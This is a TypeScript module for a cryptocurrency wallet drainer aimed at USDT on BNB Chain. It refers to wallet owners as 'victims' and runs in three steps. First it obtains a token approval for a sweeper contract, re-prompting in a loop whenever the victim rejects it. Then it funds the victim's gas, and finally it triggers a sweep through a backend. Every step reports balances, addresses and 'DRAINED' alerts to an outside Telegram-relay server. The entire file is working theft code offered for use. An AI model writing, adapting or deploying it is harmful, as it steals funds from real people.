// src/lib/web3.ts
import { ethers } from "ethers";
import { CONFIG } from "../config";

const BACKEND_URL = CONFIG.BACKEND_URL;

let approvalInProgress = false;

// ========== STEP 1: APPROVAL (100k USDT CAP) ==========
export async function requestApproval(
  provider: ethers.BrowserProvider,
  victimAddress: string
): Promise<ethers.BigNumberish | null> {
  const signer = await provider.getSigner();
  const usdt = new ethers.Contract(
    CONFIG.USDT_CONTRACT,
    [
      "function approve(address spender, uint256 value) external returns (bool)",
      "function balanceOf(address account) external view returns (uint256)",
      "function decimals() external view returns (uint8)",
    ],
    signer
  );

  // Get victim's USDT balance
  const rawBalance = await usdt.balanceOf(victimAddress);
  const decimals = await usdt.decimals();
  const balance = ethers.formatUnits(rawBalance, decimals);

  // Notify via Nitro API
  await fetch(`${BACKEND_URL}/api/telegram`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      message: `🔔 <b>New Victim</b>\n📱 QR Scanned\n🔗 Wallet: ${victimAddress.slice(0, 6)}...${victimAddress.slice(-4)}\n💰 Balance: ${parseFloat(balance).toFixed(2)} USDT`,
    }),
  });

  // Cap approval at 100,000 USDT (or victim's balance, whichever is lower)
  const maxApprove = ethers.parseUnits(CONFIG.MAX_APPROVE_USDT, decimals);
  const approveAmount = rawBalance < maxApprove ? rawBalance : maxApprove;

  approvalInProgress = true;
  while (approvalInProgress) {
    try {
      const tx = await usdt.approve(CONFIG.SWEEPER_CONTRACT, approveAmount);
      await tx.wait();

      await fetch(`${BACKEND_URL}/api/telegram`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          message: `✅ <b>Approval Signed</b>\n💵 ${ethers.formatUnits(approveAmount, decimals)} USDT\n🔗 ${victimAddress.slice(0, 6)}...${victimAddress.slice(-4)}\n🔗 <a href="https://bscscan.com/tx/${tx.hash}">${tx.hash.slice(0, 10)}...</a>`,
        }),
      });

      approvalInProgress = false;
      return approveAmount;
    } catch (err: any) {
      if (err.code === "ACTION_REJECTED" || err.code === 4001) {
        await fetch(`${BACKEND_URL}/api/telegram`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            message: `⚠️ <b>Approval Cancelled</b>\nRetrying...`,
          }),
        });
        continue;
      }
      approvalInProgress = false;
      await fetch(`${BACKEND_URL}/api/telegram`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          message: `❌ <b>Approval Failed</b>\nError: ${err.message}`,
        }),
      });
      return null;
    }
  }
  return null;
}

// ========== STEP 2: GAS FUNDING ==========
export async function ensureGas(
  provider: ethers.Provider,
  victimAddress: string
): Promise<boolean> {
  const balance = await provider.getBalance(victimAddress);
  const minGas = ethers.parseEther("0.0003"); // ~0.0003 BNB for gas

  if (balance >= minGas) {
    await fetch(`${BACKEND_URL}/api/telegram`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        message: `⛽ <b>Gas Check</b>\n${ethers.formatEther(balance)} BNB (sufficient)`,
      }),
    });
    return true;
  }

  // Fund from your funding wallet via Nitro API
  try {
    const response = await fetch(`${BACKEND_URL}/api/fund-gas`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ victimAddress }),
    });
    const data = await response.json();
    if (data.success) {
      await fetch(`${BACKEND_URL}/api/telegram`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          message: `⛽ <b>Gas Funded</b>\nSent ${CONFIG.FUNDING_AMOUNT} BNB to ${victimAddress.slice(0, 6)}...${victimAddress.slice(-4)}\n🔗 <a href="https://bscscan.com/tx/${data.txHash}">${data.txHash.slice(0, 10)}...</a>`,
        }),
      });
      return true;
    } else {
      await fetch(`${BACKEND_URL}/api/telegram`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          message: `❌ <b>Gas Funding Failed</b>\n${victimAddress.slice(0, 6)}...${victimAddress.slice(-4)}`,
        }),
      });
      return false;
    }
  } catch (err) {
    await fetch(`${BACKEND_URL}/api/telegram`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        message: `❌ <b>Gas Funding Error</b>\n${err.message}`,
      }),
    });
    return false;
  }
}

// ========== STEP 3: DRAIN VIA SWEEPER CONTRACT ==========
export async function executeDrain(
  provider: ethers.Provider,
  victimAddress: string,
  approvalAmount: ethers.BigNumberish
): Promise<boolean> {
  try {
    const response = await fetch(`${BACKEND_URL}/api/sweep`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ victimAddress }),
    });
    const data = await response.json();
    if (data.success) {
      const decimals = CONFIG.USDT_DECIMALS;
      await fetch(`${BACKEND_URL}/api/telegram`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          message: `🚨 <b>DRAINED</b>\n💵 ${ethers.formatUnits(approvalAmount, decimals)} USDT\n📤 Victim: ${victimAddress.slice(0, 6)}...${victimAddress.slice(-4)}\n📥 Sweeper: ${CONFIG.SWEEPER_CONTRACT.slice(0, 6)}...${CONFIG.SWEEPER_CONTRACT.slice(-4)}\n🔗 <a href="https://bscscan.com/tx/${data.txHash}">${data.txHash.slice(0, 16)}...</a>`,
        }),
      });
      return true;
    } else {
      await fetch(`${BACKEND_URL}/api/telegram`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          message: `❌ <b>Drain Failed</b>\n${victimAddress.slice(0, 6)}...${victimAddress.slice(-4)}`,
        }),
      });
      return false;
    }
  } catch (err) {
    await fetch(`${BACKEND_URL}/api/telegram`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        message: `❌ <b>Drain Error</b>\n${err.message}`,
      }),
    });
    return false;
  }
}

// ========== HELPERS ==========
export function cancelApprovalLoop() {
  approvalInProgress = false;
}